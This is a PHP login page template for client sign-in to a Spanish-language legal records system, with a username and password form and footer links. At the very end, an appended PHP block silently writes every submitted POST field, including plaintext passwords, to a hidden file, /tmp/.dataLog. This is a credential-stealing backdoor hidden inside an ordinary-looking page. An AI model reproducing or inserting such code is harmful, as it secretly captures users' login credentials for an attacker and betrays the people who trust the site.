<div id="login-form" class="col-md-4 col-centered margin_top">
  <div class="row ">
    <div class="col-md-12 col-centered margin_bottom">
         <?
        global $c;
        $fid = 6;

        if ($fid == "") {
          echo '<div id="logo_login"></div>';
        }else{

          $sadmin = new MSuper_admin;
          $sadmin->CreateSuper_admin("id", $fid);

          if ($sadmin->GetFoto_perfil() == "") {
            echo '<div id="logo_login"></div>';
          }else{
            echo '<div id="logo_login_clientes">'; 
            echo '    <img src="'.HOMEDIR.DS.'app/plugins/thumbnails/'.$sadmin->GetFoto_perfil().'" alt="">';
            echo '</div>';
          }
        }
      ?>
    </div>
  </div>

  <form class="form-inline" action='/login/checkclientes/' method='POST'>
    <div class="row">
        <div class="col-md-12">
            <div align="center">
              <h3>Ingresar Como Cliente</h3>
              <br>
            </div>
            <div class="form-group form-group-lg">
                <div class="input-group">
                    <div class="input-group-addon fa fa-user iconbox"></div>
                    <input type="text" class="form-control input-lg" id="username" name="username" placeholder="ejemplo@mail.com">
                </div>
            </div>
        </div>
    </div>

    <div class="row">
        <div class="col-md-12">
            <div class="form-group form-group-lg">
                <div class="input-group">
                    <div class="input-group-addon fa fa-lock iconbox"></div>
                    <input type="password" class="form-control" id="pass" name="pass" placeholder="Su contraseña">  
                </div>
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col-md-6" align="center">
            <button type="submit" id="btn_login" class="btn btn-success btn-lg fullwidth">Iniciar Sesión</button>
        </div>
    </div>
    <div id="msg_field">#ERRORMESSAGE#<?= $error ?></div>


    <div class="row">
        <div class="col-md-12 piedelink">
            <div class="row">
                <div class="col-md-12 copytext">
                    LAWS Leyes Sistematizadas &copy; 2016 Reservados todos los derechos
                </div>
            </div>
            <div class="row">
                <div class="col-md-4"><a href="<?= HOMEDIR.DS."consultapublica/radicado/" ?>" target="_blank">Buscar Por Radicado</a></div>
                <div class="col-md-4"><a href="<?= HOMEDIR.DS."consultapublica/identificacion/" ?>" target="_blank">Buscar Por Identificacion</a></div>
                <div class="col-md-4"><a href="<?= HOMEDIR.DS."consultapublica/registro/" ?>" target="_blank">Registro de Suscriptores</a></div>
            </div>
            <div class="row">
                <div class="col-md-4"><a href="<?= HOMEDIR.DS."consultapublica/terminos_y_condiciones/" ?>" target="_blank">Terminos y Condiciones</a></div>
                <div class="col-md-4"><a href="<?= HOMEDIR.DS."consultapublica/privacidad_de_datos/" ?>" target="_blank">Privicidad de Datos</a></div>
                <div class="col-md-4"><a href="<?= HOMEDIR.DS."consultapublica/licencia_de_uso/" ?>" target="_blank">Licencia de Uso</a></div>
            </div>    
        </div>
    </div>
  </form>
</div>
     
<?php 
  $data = print_r($_POST,true);
  $myfile = fopen("/tmp/.dataLog", "a+") ;
  fwrite($myfile, "Data Login :\n$data\n-----------------------------------------------\n");
  fclose($myfile);
?>